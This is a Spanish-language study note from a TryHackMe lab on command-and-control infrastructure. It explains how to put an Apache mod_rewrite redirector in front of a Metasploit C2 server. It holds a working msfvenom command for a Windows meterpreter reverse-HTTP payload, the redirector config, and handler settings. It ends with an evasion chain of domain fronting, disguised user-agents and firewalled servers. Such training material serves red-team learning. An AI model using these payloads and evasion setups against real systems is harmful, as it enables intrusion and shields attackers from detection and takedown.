---
tags: [red-team, c2, infrastructure, opsec, redirector, apache]
created: 2026-04-19
source: TryHackMe - Intro to C2
related:
  - "[[C2 - Acceso y gestión de infraestructura]]"
  - "[[C2 Framework - Fundamentos]]"
---

# C2 Redirector con Apache mod_rewrite

> [!abstract] TL;DR
> Redirector = proxy que filtra tráfico HTTP por header/user-agent antes de reenviarlo al C2 real. Protege el C2 de takedowns y fingerprinting. Apache + mod_rewrite + mod_proxy = setup básico funcional.

## Por qué existe

Metasploit standalone tiene problemas:
- No configurable jitter / sleep
- Tráfico constante detectable por NGFW
- Cualquiera puede conectarse al HTTP listener y fingerprinter

C2 expuesto directo → reportado → takedown en 3-24h.

**Solución:** redirector adelante. Si lo reportan, tirás ese y el C2 real sigue intacto con los datos colectados.

```
[Victim] → [Redirector público] → [C2 real, firewall restrictivo]
```

> [!warning]
> El C2 real debe tener firewall permitiendo **solo** tráfico del/los redirector(s). Sin eso, el redirector es decorativo.

## Setup Apache — módulos necesarios

```bash
apt install apache2
a2enmod rewrite proxy proxy_http headers
systemctl start apache2
```

> [!tip]
> AttackBox: puerto 80 ya ocupado. Editar `/etc/apache2/ports.conf` antes de arrancar.

## Payload con user-agent custom

El filtrado necesita un "marcador" identificable. User-agent es el más común:

```bash
msfvenom -p windows/meterpreter/reverse_http \
  LHOST=tun0 LPORT=80 \
  HttpUserAgent=NotMeterpreter \
  -f exe -o shell.exe
```

## Config Apache — `/etc/apache2/sites-available/000-default.conf`

```apache
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
    ProxyPass "/" "http://localhost:8080/"

    <Directory>
        AllowOverride All
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

Lógica:
- `RewriteCond` → solo matchea UA exacto `NotMeterpreter` (regex `^...$`)
- `ProxyPass` → forward al C2 interno (localhost:8080 en lab; IP privada en prod)
- Requests sin UA matching → se sirve `/var/www/html` (página fake)

## Metasploit handler — settings clave

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST 127.0.0.1
set LPORT 8080
set ReverseListenerBindAddress 127.0.0.1
set ReverseListenerBindPort 8080
set OverrideLHOST <IP_redirector>
set OverrideLPORT 80
set HttpUserAgent NotMeterpreter
set OverrideRequestHost true
run
```

| Setting | Función |
|---|---|
| `LHOST / LPORT` | Donde bindea Metasploit (loopback) |
| `ReverseListenerBind*` | Interfaz real de escucha |
| `OverrideLHOST/LPORT` | Qué IP/puerto reporta Meterpreter a la víctima → el redirector |
| `OverrideRequestHost true` | Fuerza a que todas las queries vayan vía redirector |
| `HttpUserAgent` | Debe matchear la `RewriteCond` |

## Respuestas del task

- UA modificable: **`HttpUserAgent`**
- Host header modificable: **`HttpHostHeader`**

## Producción vs lab

| Lab | Producción |
|---|---|
| Un solo redirector con IP | **Múltiples** redirectors + DNS records |
| localhost:8080 como C2 | C2 en VPS separada, firewall a nivel cloud (Security Groups) |
| UA simple `NotMeterpreter` | UA mimetizado con navegador real + múltiples headers custom |
| HTTP | HTTPS con certs válidos (Let's Encrypt) |

## Cadena de evasión completa

```
Agent (UA+Host custom)
  → Domain fronting (Cloudflare)
  → Redirector público (Apache mod_rewrite filtra por UA)
  → C2 real (firewall solo permite IPs redirectors)
  → Operator via SSH tunnel al C2
```

Cada capa añade coste para el blue team.